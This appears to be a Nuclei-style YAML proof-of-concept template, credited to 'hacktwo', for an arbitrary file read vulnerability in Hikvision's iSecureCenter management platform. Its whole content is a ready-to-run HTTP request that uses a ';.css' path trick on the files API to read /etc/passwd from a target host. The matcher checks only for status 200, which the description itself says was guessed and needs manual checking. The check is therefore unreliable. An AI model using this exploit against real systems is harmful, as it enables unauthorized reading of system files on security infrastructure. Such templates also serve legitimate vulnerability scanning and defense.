id: poc-80e1311bcc9a5aadc048
info:
  name: 海康威视iSecureCenter综合安防管理平台files接口存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36

    Connection: close

    Accept-Encoding: gzip, deflate, br'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
